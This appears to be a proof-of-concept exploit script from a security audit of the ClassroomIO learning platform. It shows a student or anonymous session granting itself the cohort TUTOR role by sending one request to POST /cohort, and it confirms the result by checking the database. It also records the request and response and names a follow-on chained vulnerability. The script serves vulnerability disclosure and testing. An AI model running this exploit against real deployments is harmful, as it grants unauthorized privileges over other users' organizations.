#!/usr/bin/env python3
"""
VULN-010 (F-41) — Cohort creation self-grants cohort TUTOR (+ body organizationId).

Vulnerable code (targets/classroomio/):
  * route:   apps/api/src/routes/cohort/cohort.ts:121-135   (POST '/', authMiddleware ONLY)
  * service: apps/api/src/services/cohort/cohort.ts:127-140 (createCohort → createCohortWithCreatorMembership)
  * query:   packages/db/src/queries/cohort/cohort.ts:37-60 (inserts cohortMember roleId=ROLE.TUTOR)
  * schema:  packages/utils/src/validation/cohort/cohort.ts:4-8 (ZCreateCohort .extend organizationId)

Class: CWE-269 improper privilege management + CWE-915 mass assignment.

The flaw: `POST /cohort` is gated by `authMiddleware` alone — no org-membership or
role check. The body `organizationId` is passed straight through to the insert, and
the query unconditionally inserts the creator as a `cohortMember` with roleId=TUTOR (2).
So any authenticated principal (a self-registered STUDENT, or even an anonymous
better-auth session — VULN-018) creates a cohort in the org and self-grants the
privileged cohort-TUTOR role, which then satisfies `cohortTeamMemberMiddleware`
(the gate for cohort invite / add-course / newsfeed — the precondition for VULN-009).

Exploitation idea: as a plain STUDENT, POST /cohort with the org's uuid; read back
the created cohort's `cohort_member` row.

A successful run proves: a principal that holds only STUDENT (roleId 3) in the org
ends up as roleId TUTOR (2) of a freshly-created cohort — a vertical privilege
escalation performed with a single unprivileged request.
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import (  # noqa: E402
    log, banner, verdict, rid, psql, make_student, admin_login, anon_session, ROLE, ORG_ID,
)

VULN = "VULN-010"
HERE = os.path.dirname(os.path.abspath(__file__))


def create_cohort(client, org_id, name):
    """POST /cohort — the vulnerable endpoint (authMiddleware only)."""
    return client.post("/cohort", org=True, org_id=org_id,
                       json={"organizationId": org_id, "name": name})


def main():
    banner(VULN, "Cohort creation self-grants cohort TUTOR (any session)")
    log("INFO", "route apps/api/src/routes/cohort/cohort.ts:121 — POST '/' gated by authMiddleware ONLY")
    log("INFO", "query packages/db/src/queries/cohort/cohort.ts:48-52 — creator inserted as cohortMember roleId=TUTOR")

    # ── Precondition: a plain STUDENT of the org (roleId 3), created via the app's
    #    own share-link flow. This is the lowest-privileged real member.
    log("SETUP", "provisioning a plain STUDENT member of the org (make_student)")
    admin = admin_login()
    student, info = make_student(admin, label="cohort-attacker")
    sid = info["user_id"]
    log("SETUP", f"student user={sid} role_in_org={info['role_in_org']} (3=STUDENT) — NOT a tutor/admin anywhere")

    # Ground truth before: this profile is a TUTOR of zero cohorts.
    tutor_before = psql(f"select count(*) from cohort_member "
                        f"where profile_id='{sid}' and role_id={ROLE['TUTOR']};")
    log("INFO", f"cohort_member rows where this student is TUTOR, before = {tutor_before}")

    # ── Attack: the STUDENT creates a cohort. authMiddleware is the only gate.
    name = f"pwn-cohort-{rid('c')}"
    log("STEP", f"POST /cohort  as STUDENT  {{organizationId: {ORG_ID}, name: {name!r}}}")
    r = create_cohort(student, ORG_ID, name)
    log("INFO", f"  response: HTTP {r.status_code} {r.text[:220]}")

    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write(f"### {VULN} — self-grant cohort TUTOR (STUDENT session)\n")
        f.write("### Cookie: classroomio.session_token=<STUDENT session>  (roleId 3 in the org)\n\n")
        f.write("POST http://localhost:21527/cohort HTTP/1.1\n")
        f.write("Host: localhost:21527\n")
        f.write(f"cio-org-id: {ORG_ID}\n")
        f.write("Content-Type: application/json\n\n")
        f.write(f'{{"organizationId":"{ORG_ID}","name":"{name}"}}\n')

    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(f"POST /cohort (STUDENT session, cio-org-id header)\nHTTP {r.status_code}\n\n{r.text}\n")

    if r.status_code not in (200, 201):
        verdict(VULN, "FAILED", f"cohort create returned HTTP {r.status_code}")
        log("FAIL", "the endpoint rejected the STUDENT — no privesc")
        sys.exit(1)

    cohort_id = (r.json().get("data") or {}).get("id")
    log("INFO", f"  created cohort id={cohort_id}")

    # ── Ground-truth side effect: the STUDENT is now cohort-TUTOR of this cohort.
    role_row = psql(f"select role_id from cohort_member "
                    f"where cohort_id='{cohort_id}' and profile_id='{sid}';")
    org_row = psql(f"select organization_id from cohort where id='{cohort_id}';")
    log("PROOF", f"cohort_member(cohort={cohort_id}, profile={sid}).role_id = {role_row!r} "
                 f"(expected '{ROLE['TUTOR']}' = TUTOR)")
    log("PROOF", f"cohort.organization_id = {org_row!r} (body-supplied, expected {ORG_ID})")

    with open(os.path.join(HERE, "response.txt"), "a") as f:
        f.write(f"\n-- DB side effect --\n")
        f.write(f"cohort_member role_id (this student) = {role_row}\n")
        f.write(f"cohort.organization_id = {org_row}\n")

    self_tutor = role_row == str(ROLE["TUTOR"])

    # ── Bonus: the same works from a fully anonymous session (VULN-018 chain → PR:N).
    anon_tutor = False
    anon_cohort_id = None
    try:
        log("STEP", "bonus: POST /cohort from an ANONYMOUS better-auth session (no signup)")
        anon = anon_session()
        aid = (anon.user or {}).get("id")
        ra = create_cohort(anon, ORG_ID, f"anon-cohort-{rid('a')}")
        log("INFO", f"  anon response: HTTP {ra.status_code} {ra.text[:160]}")
        if ra.status_code in (200, 201):
            anon_cohort_id = (ra.json().get("data") or {}).get("id")
            arole = psql(f"select role_id from cohort_member "
                         f"where cohort_id='{anon_cohort_id}' and profile_id='{aid}';")
            log("PROOF", f"anon cohort_member.role_id = {arole!r} (expected '{ROLE['TUTOR']}')")
            anon_tutor = arole == str(ROLE["TUTOR"])
    except Exception as e:
        log("INFO", f"  (anon path skipped: {e})")

    if self_tutor:
        extra = " (also confirmed from an anonymous session → unauthenticated)" if anon_tutor else ""
        verdict(VULN, "CONFIRMED",
                f"STUDENT self-granted cohort TUTOR via POST /cohort{extra}")
        log("OK", "exploit confirmed — vertical privesc STUDENT(3) → cohort TUTOR(2) in one request")
        # Emit the cohort id + student cookie hint for the VULN-009 chain.
        log("INFO", f"chain: cohort {cohort_id} (attacker is TUTOR) is the VULN-009 precondition")
        sys.exit(0)

    verdict(VULN, "FAILED", f"cohort created but role_id={role_row!r}, not TUTOR")
    log("FAIL", "no TUTOR membership row was created for the caller")
    sys.exit(1)


if __name__ == "__main__":
    main()
